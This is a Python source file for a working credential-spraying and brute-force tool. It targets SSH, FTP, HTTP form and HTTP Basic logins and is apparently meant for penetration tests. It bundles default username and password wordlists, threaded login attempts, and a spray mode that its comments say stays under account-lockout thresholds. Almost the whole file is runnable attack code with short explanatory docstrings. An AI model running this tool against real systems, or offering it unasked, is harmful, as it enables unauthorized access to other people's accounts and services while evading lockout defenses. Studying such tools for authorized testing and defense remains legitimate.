#!/usr/bin/env python3
"""
Credential Sprayer
==================
WHAT THIS DOES:
    Attempts to log into services (SSH, FTP, HTTP) using lists of
    usernames and passwords. Two modes:
    - Brute force: try every combo of user + password
    - Spray: try ONE password across MANY users (avoids lockouts)

WHY IT MATTERS:
    Weak/default credentials are the #1 way into systems in real
    engagements. After you find open SSH, FTP, or web login ports,
    this is how you test them.

    Password spraying is especially effective in corporate environments
    because:
    - People use "Company2025!" as their password
    - Default creds on devices (admin/admin, root/root)
    - Service accounts with weak passwords
    - Lockout policies only trigger on per-user attempts

HOW PASSWORD SPRAYING DIFFERS FROM BRUTE FORCE:
    Brute force:  try user1 with ALL passwords, then user2 with ALL...
                  → triggers lockouts fast
    Spray:        try ALL users with password1, wait, then password2...
                  → stays under lockout thresholds

USAGE:
    python3 credspray.py ssh 192.168.1.1
    python3 credspray.py ssh 192.168.1.1 -u admin -P passwords.txt
    python3 credspray.py ssh 192.168.1.1 -U users.txt -P passwords.txt
    python3 credspray.py ftp 192.168.1.1
    python3 credspray.py http http://target.com/login
    python3 credspray.py ssh 192.168.1.1 --spray --delay 30
"""

import sys
import argparse
import socket
import ftplib
import time
import urllib.request
import urllib.parse
import urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# Default credentials to try — based on real breach data and defaults
DEFAULT_USERS = [
    "admin", "root", "user", "test", "guest", "administrator",
    "ubuntu", "ec2-user", "deploy", "devops", "jenkins", "git",
    "pi", "vagrant", "ansible", "docker", "www-data", "nginx",
    "mysql", "postgres", "oracle", "ftp", "ftpuser", "backup",
    "monitor", "nagios", "zabbix", "service", "support",
    "info", "webmaster", "operator",
]

DEFAULT_PASSWORDS = [
    # Empties and defaults
    "", "password", "admin", "root", "toor", "guest",
    "changeme", "default", "letmein", "welcome",
    # Common
    "123456", "12345678", "123456789", "1234567890",
    "password1", "password123", "admin123", "root123",
    "test", "test123", "temp", "temp123",
    "qwerty", "qwerty123", "abc123",
    # Patterns
    "p@ssw0rd", "P@ssw0rd", "P@ssword1", "P@ssword1!",
    "Password1", "Password1!", "Password123",
    "Admin123", "Admin123!", "Admin1234",
    # Seasonal (update these yearly)
    "Summer2025", "Summer2025!", "Winter2025", "Winter2025!",
    "Spring2025", "Spring2025!", "Fall2025", "Fall2025!",
    "Summer2024", "Winter2024",
    "Company1", "Company123", "Company2025",
    "Welcome1", "Welcome123", "Welcome1!",
    # Keyboard patterns
    "1q2w3e4r", "1qaz2wsx", "qwer1234", "zaq1xsw2",
    # Device defaults
    "admin/admin", "cisco", "cisco123",
    "ubnt", "MikroTik",
]


def try_ssh(host, port, username, password, timeout=5):
    """
    Attempt SSH login.

    Uses paramiko (if available) or socket-level banner check.
    SSH is the most common target for credential attacks on Linux servers.
    """
    try:
        import paramiko

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(
                host, port=port, username=username, password=password,
                timeout=timeout, allow_agent=False, look_for_keys=False,
                banner_timeout=timeout,
            )
            client.close()
            return True, "SSH login successful"
        except paramiko.AuthenticationException:
            return False, "Auth failed"
        except paramiko.SSHException as e:
            return False, f"SSH error: {e}"
        except Exception as e:
            return False, f"Connection error: {e}"
        finally:
            client.close()

    except ImportError:
        # Fallback: socket-level check (can't actually auth without paramiko)
        return False, "Install paramiko: pip install paramiko"


def try_ftp(host, port, username, password, timeout=5):
    """
    Attempt FTP login.

    FTP sends credentials in PLAINTEXT — this is why it's being
    replaced by SFTP everywhere. But it's still common on:
    - Embedded devices, printers, IoT
    - Legacy file servers
    - Misconfigured web hosting
    """
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=timeout)
        ftp.login(username, password)
        banner = ftp.getwelcome()
        ftp.quit()
        return True, f"FTP login successful — {banner}"
    except ftplib.error_perm as e:
        return False, f"Auth failed: {e}"
    except Exception as e:
        return False, f"Connection error: {e}"


def try_http_form(url, username, password, username_field="username",
                  password_field="password", fail_text="invalid",
                  timeout=5):
    """
    Attempt HTTP form login.

    Most web apps use POST-based form authentication. We submit
    credentials and check the response for success/failure indicators.

    This is a simplified version — real tools like Hydra handle
    redirects, cookies, CSRF tokens, etc.
    """
    data = urllib.parse.urlencode({
        username_field: username,
        password_field: password,
    }).encode()

    try:
        req = urllib.request.Request(url, data=data, method="POST")
        req.add_header("User-Agent",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")

        response = urllib.request.urlopen(req, timeout=timeout)
        body = response.read().decode("utf-8", errors="ignore").lower()

        # Check for failure indicators
        fail_indicators = [
            fail_text.lower(), "invalid", "incorrect", "failed",
            "wrong", "error", "denied", "unauthorized",
            "try again", "bad credentials",
        ]

        for indicator in fail_indicators:
            if indicator in body:
                return False, "Auth failed"

        # If no failure indicator found and we got 200, might be success
        return True, f"Possible success (no failure indicators in response)"

    except urllib.error.HTTPError as e:
        if e.code == 401:
            return False, "401 Unauthorized"
        elif e.code == 403:
            return False, "403 Forbidden"
        elif e.code == 302:
            # Redirect after login often means success
            return True, f"Redirect to {e.headers.get('Location', '?')}"
        return False, f"HTTP {e.code}"
    except Exception as e:
        return False, f"Error: {e}"


def try_http_basic(url, username, password, timeout=5):
    """
    Attempt HTTP Basic Authentication.

    Some endpoints use HTTP Basic Auth (the browser popup).
    Credentials are Base64 encoded (NOT encrypted) in the header.
    """
    import base64

    credentials = base64.b64encode(f"{username}:{password}".encode()).decode()

    try:
        req = urllib.request.Request(url)
        req.add_header("Authorization", f"Basic {credentials}")
        req.add_header("User-Agent", "Mozilla/5.0")

        response = urllib.request.urlopen(req, timeout=timeout)
        return True, f"HTTP Basic Auth successful (status {response.status})"

    except urllib.error.HTTPError as e:
        if e.code == 401:
            return False, "401 Unauthorized"
        elif e.code == 403:
            return False, "403 Forbidden"
        return False, f"HTTP {e.code}"
    except Exception as e:
        return False, f"Error: {e}"


def spray(service, target, users, passwords, port=None, threads=5,
          spray_mode=False, delay=0, timeout=5, http_opts=None):
    """
    Run credential spray/brute-force attack.

    Args:
        service: ssh, ftp, http-form, http-basic
        target: IP or URL
        users: List of usernames
        passwords: List of passwords
        port: Service port (auto-detected if None)
        threads: Concurrent threads
        spray_mode: If True, try one password across all users before next
        delay: Seconds between spray rounds
        timeout: Connection timeout
        http_opts: Dict with username_field, password_field, fail_text
    """
    # Default ports
    default_ports = {"ssh": 22, "ftp": 21, "http-form": 80, "http-basic": 80}
    if port is None:
        port = default_ports.get(service, 22)

    # Select the right function
    if service == "ssh":
        try_func = lambda u, p: try_ssh(target, port, u, p, timeout)
    elif service == "ftp":
        try_func = lambda u, p: try_ftp(target, port, u, p, timeout)
    elif service == "http-form":
        opts = http_opts or {}
        try_func = lambda u, p: try_http_form(
            target, u, p,
            username_field=opts.get("username_field", "username"),
            password_field=opts.get("password_field", "password"),
            fail_text=opts.get("fail_text", "invalid"),
            timeout=timeout,
        )
    elif service == "http-basic":
        try_func = lambda u, p: try_http_basic(target, u, p, timeout)
    else:
        print(f"[!] Unknown service: {service}")
        return []

    found = []
    total = len(users) * len(passwords)
    attempts = 0
    start_time = datetime.now()

    print(f"\n[*] Service:   {service}")
    print(f"[*] Target:    {target}:{port}")
    print(f"[*] Users:     {len(users)}")
    print(f"[*] Passwords: {len(passwords)}")
    print(f"[*] Mode:      {'Spray' if spray_mode else 'Brute force'}")
    print(f"[*] Combos:    {total}")
    print(f"[*] Threads:   {threads}")
    print(f"[*] Started:   {start_time.strftime('%H:%M:%S')}\n")

    if spray_mode:
        # Spray: one password at a time across all users
        for pwd_idx, password in enumerate(passwords):
            if pwd_idx > 0 and delay > 0:
                print(f"  [*] Waiting {delay}s before next password...")
                time.sleep(delay)

            print(f"  [*] Spraying: '{password}' ({pwd_idx + 1}/{len(passwords)})")

            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {}
                for user in users:
                    futures[executor.submit(try_func, user, password)] = (user, password)

                for future in as_completed(futures):
                    user, pwd = futures[future]
                    attempts += 1
                    success, msg = future.result()

                    if success:
                        found.append({"user": user, "password": pwd, "msg": msg})
                        print(f"  [+] FOUND: {user}:{pwd} — {msg}")
                    elif "error" not in msg.lower():
                        pass  # Silent on normal auth failures

    else:
        # Brute force: all passwords per user
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {}
            for user in users:
                for password in passwords:
                    futures[executor.submit(try_func, user, password)] = (user, password)

            for future in as_completed(futures):
                user, pwd = futures[future]
                attempts += 1
                success, msg = future.result()

                if success:
                    found.append({"user": user, "password": pwd, "msg": msg})
                    print(f"  [+] FOUND: {user}:{pwd} — {msg}")

                if attempts % 50 == 0:
                    pct = (attempts / total) * 100
                    sys.stdout.write(f"\r  [{pct:.0f}% — {attempts}/{total}]")
                    sys.stdout.flush()

        print()

    duration = (datetime.now() - start_time).total_seconds()

    # Results
    print(f"\n{'='*50}")
    print(f"Credential Spray Results")
    print(f"{'='*50}")
    print(f"Target:    {target}:{port} ({service})")
    print(f"Attempts:  {attempts}")
    print(f"Duration:  {duration:.1f}s")
    print(f"Rate:      {attempts/duration:.0f} attempts/sec" if duration > 0 else "")

    if found:
        print(f"\nValid Credentials Found: {len(found)}")
        print(f"{'Username':<20} {'Password':<25} {'Details'}")
        print("-" * 65)
        for cred in found:
            print(f"{cred['user']:<20} {cred['password']:<25} {cred['msg']}")
    else:
        print(f"\nNo valid credentials found.")
        print("Try:")
        print("  - A larger wordlist (SecLists)")
        print("  - Custom wordlist based on target (company name, etc.)")
        print("  - Spray mode with delay to avoid lockouts")

    return found


def main():
    parser = argparse.ArgumentParser(
        description="Credential Sprayer — brute-force service logins",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Services:
  ssh         SSH login (requires paramiko: pip install paramiko)
  ftp         FTP login
  http-form   HTTP POST form login
  http-basic  HTTP Basic Authentication

Examples:
  python3 credspray.py ssh 192.168.1.1
  python3 credspray.py ssh 192.168.1.1 -u admin -P passwords.txt
  python3 credspray.py ftp 192.168.1.1 -u anonymous -p ""
  python3 credspray.py http-form http://target/login --user-field email
  python3 credspray.py ssh 192.168.1.1 --spray --delay 30
        """
    )

    parser.add_argument("service", choices=["ssh", "ftp", "http-form", "http-basic"])
    parser.add_argument("target", help="Target IP or URL")
    parser.add_argument("-p", "--port", type=int, help="Service port")
    parser.add_argument("-u", "--user", help="Single username")
    parser.add_argument("-U", "--userlist", help="File with usernames")
    parser.add_argument("--password", dest="single_pass", help="Single password")
    parser.add_argument("-P", "--passlist", help="File with passwords")
    parser.add_argument("-t", "--threads", type=int, default=5)
    parser.add_argument("--timeout", type=float, default=5)
    parser.add_argument("--spray", action="store_true",
                        help="Spray mode: one password across all users")
    parser.add_argument("--delay", type=int, default=0,
                        help="Delay between spray rounds (seconds)")
    # HTTP options
    parser.add_argument("--user-field", default="username",
                        help="HTTP form username field name")
    parser.add_argument("--pass-field", default="password",
                        help="HTTP form password field name")
    parser.add_argument("--fail-text", default="invalid",
                        help="Text that indicates failed login")

    args = parser.parse_args()

    # Build user list
    if args.user:
        users = [args.user]
    elif args.userlist:
        with open(args.userlist) as f:
            users = [line.strip() for line in f if line.strip()]
    else:
        users = DEFAULT_USERS

    # Build password list
    if args.single_pass is not None:
        passwords = [args.single_pass]
    elif args.passlist:
        with open(args.passlist) as f:
            passwords = [line.strip() for line in f if line.strip()]
    else:
        passwords = DEFAULT_PASSWORDS

    http_opts = {
        "username_field": args.user_field,
        "password_field": args.pass_field,
        "fail_text": args.fail_text,
    }

    spray(
        args.service, args.target, users, passwords,
        port=args.port, threads=args.threads,
        spray_mode=args.spray, delay=args.delay,
        timeout=args.timeout, http_opts=http_opts,
    )


if __name__ == "__main__":
    main()
